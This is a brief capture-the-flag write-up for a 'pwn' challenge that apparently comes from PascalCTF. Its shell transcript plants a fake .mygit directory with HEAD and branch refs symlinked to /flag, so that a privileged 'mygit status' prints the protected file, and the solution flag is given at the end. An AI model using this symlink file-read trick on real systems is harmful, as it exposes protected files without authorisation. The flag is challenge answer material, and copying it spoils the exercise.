# pwn - Grande Inutile Too

-create manual .mygit instead of using real .mygit. this will avoid auto root creation
-touch the file and echo the symlink to the /flag

```
NyJJrn8OOp3d@dad9648cffa0:~$ mkdir -p ~/exploit/refs/heads
NyJJrn8OOp3d@dad9648cffa0:~$ cd ~/exploit
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ mkdir .mygit
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ mv refs .mygit
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ echo "refs/heads/main" > .mygit/HEAD
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ ln -s /flag .mygit/refs/heads/main
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ ln -sf /flag .mygit/HEAD
NyJJrn8OOp3d@dad9648cffa0:~/exploit$ mygit status
On branch pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}


```

⁨⁨Flag: `pascalCTF{m4ny_fr13nds_0f_m1n3_h4t3_git_btw}`
SOLVED by OS1RIS

Solved by: yappare